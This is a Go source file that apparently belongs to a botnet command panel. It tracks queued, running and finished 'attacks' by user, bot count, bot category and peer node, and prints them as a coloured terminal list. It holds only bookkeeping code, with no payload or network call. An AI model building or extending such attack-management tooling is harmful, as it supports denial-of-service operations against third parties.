package main

import (
	"fmt"
	"sync"
	"time"
)

type ActiveAttack struct {
	ID        int
	Cmd       string
	User      string
	StartedAt time.Time
	Duration  uint32
	BotCata   string
	Bots      int
	PeerID    int
	Stopped   bool
	Status    string // "queued", "running", "done"
}

var (
	activeMu     sync.Mutex
	activeID     int
	activeAttacks []ActiveAttack
)

func trackAttackStart(cmd, user, botCata string, duration uint32, bots, peerID int) {
	activeMu.Lock()
	defer activeMu.Unlock()
	activeID++
	attackID := activeID
	activeAttacks = append(activeAttacks, ActiveAttack{
		ID:        attackID,
		Cmd:       cmd,
		User:      user,
		StartedAt: time.Now(),
		Duration:  duration,
		BotCata:   botCata,
		Bots:      bots,
		PeerID:    peerID,
		Status:    "queued",
	})
	// status goroutine: queued → 1s → running → duration → done
	go func() {
		time.Sleep(time.Second)
		activeMu.Lock()
		for i := range activeAttacks {
			if activeAttacks[i].ID == attackID {
				activeAttacks[i].Status = "running"
				break
			}
		}
		activeMu.Unlock()
		time.Sleep(time.Duration(duration+2) * time.Second)
		activeMu.Lock()
		for i := range activeAttacks {
			if activeAttacks[i].ID == attackID {
				activeAttacks[i].Status = "done"
				break
			}
		}
		activeMu.Unlock()
	}()
	// cleanup old finished attacks
	var keep []ActiveAttack
	for _, a := range activeAttacks {
		if a.Stopped {
			continue
		}
		if time.Since(a.StartedAt) > time.Duration(a.Duration+30)*time.Second {
			continue
		}
		keep = append(keep, a)
	}
	activeAttacks = keep
}

func trackAttackStop() {
	activeMu.Lock()
	defer activeMu.Unlock()
	for i := range activeAttacks {
		if !activeAttacks[i].Stopped && activeAttacks[i].PeerID == 0 {
			activeAttacks[i].Stopped = true
		}
	}
}

func listActiveAttacks() []ActiveAttack {
	activeMu.Lock()
	defer activeMu.Unlock()
	var result []ActiveAttack
	for i := range activeAttacks {
		a := activeAttacks[i]
		if a.Stopped {
			continue
		}
		remaining := time.Duration(a.Duration)*time.Second - time.Since(a.StartedAt)
		if remaining <= -30*time.Second {
			continue
		}
		if remaining < 0 {
			remaining = 0
		}
		a.Duration = uint32(remaining.Seconds())
		result = append(result, a)
	}
	return result
}

func formatActiveAttacks() string {
	attacks := listActiveAttacks()
	if len(attacks) == 0 {
		return "\x1b[38;5;240mNo active attacks\x1b[0m\r\n"
	}
	out := "\x1b[38;5;202mActive attacks:\x1b[0m\r\n"
	for _, a := range attacks {
		nodeStr := "local"
		if a.PeerID > 0 {
			nodeStr = fmt.Sprintf("peer%d", a.PeerID)
		}
		statusColor := "\x1b[32m" // green for running
		if a.Status == "queued" {
			statusColor = "\x1b[33m" // yellow
		} else if a.Status == "done" {
			statusColor = "\x1b[90m" // gray
		}
		out += fmt.Sprintf("\x1b[38;5;240m#%d %-25s %-8s %s%-6s\x1b[38;5;240m [%ds] %s\x1b[0m\r\n",
			a.ID, truncate(a.Cmd, 25), nodeStr, statusColor, a.Status, a.Duration, a.User)
	}
	return out
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}
